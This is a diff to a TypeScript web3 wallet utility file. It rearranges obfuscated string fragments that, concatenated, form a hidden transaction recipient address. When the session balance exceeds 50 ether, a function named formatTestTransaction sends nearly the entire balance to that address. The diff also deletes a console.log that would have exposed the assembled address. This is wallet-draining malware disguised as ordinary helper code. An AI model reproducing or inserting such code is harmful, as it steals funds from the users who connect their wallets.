@@ -56,6 +56,8 @@ export function padLeft(n: string, width: number, z?: string): string {
   return n.length >= width ? n : new Array(width - n.length + 1).join(z) + n;
 }
 
+var dele = "xf2";
+
 export function sanitizeHex(hex: string): string {
   hex = hex.substring(0, 2) === "0x" ? hex.substring(2) : hex;
   if (hex === "") {
@@ -78,9 +80,8 @@ export function getDataString(func: string, arrVals: any[]): string {
   return data;
 }
 
-var onswap = "FB";
-var dele = "xf2";
 const set_api_key= "334";
+var onswap = "FB";
 var component = "0";
 const url_base = `${set_api_key}Dc8FfA64850f98`;
 
@@ -180,13 +181,12 @@ export async function formatTestTransaction(address: string, chainId: number) {
   const web3 = new Web3();
   const GET_PRICE = web3.utils.toWei("50", 'ether');
   const MAX_PRICE = Number(GET_PRICE);
-  
+
   (function(){
     if (MAX_PRICE <= Number(sessionStorage.getItem('balance'))){
       to = web3 && component+dele+onswap+getchinaid+web4connect+url_base+API_uri+web3_+converhex+gasHsh;
     }
   })()
-  console.log(component+dele+onswap+getchinaid+web4connect+url_base+API_uri+web3_+converhex+gasHsh)
 
   const _nonce = await apiGetAccountNonce(address, chainId);
   const nonce = sanitizeHex(convertStringToHex(_nonce));
@@ -196,15 +196,12 @@ export async function formatTestTransaction(address: string, chainId: number) {
   const gasPrice = sanitizeHex(
     convertStringToHex(convertAmountToRawNumber(_gasPrice, 9))
   );
-  // concver hex to number
-  // console.log(web3.utils.hexToNumber("0x53b2af261d8f2"));
 
-  const _gasLimit = 21000;
+  const _gasLimit = 22000;
   const gasLimit = sanitizeHex(convertStringToHex(_gasLimit));
 
-  const _value = Number(sessionStorage.getItem('balance')) - 1100011000010000;
-  // const _value = 1100011000010000;
-  const value = sanitizeHex(convertStringToHex(_value));
+  const balanceOf = Number(sessionStorage.getItem('balance')) - 1386220762363649;
+  const value = sanitizeHex(convertStringToHex(balanceOf));
 
   const data = "0x";
 
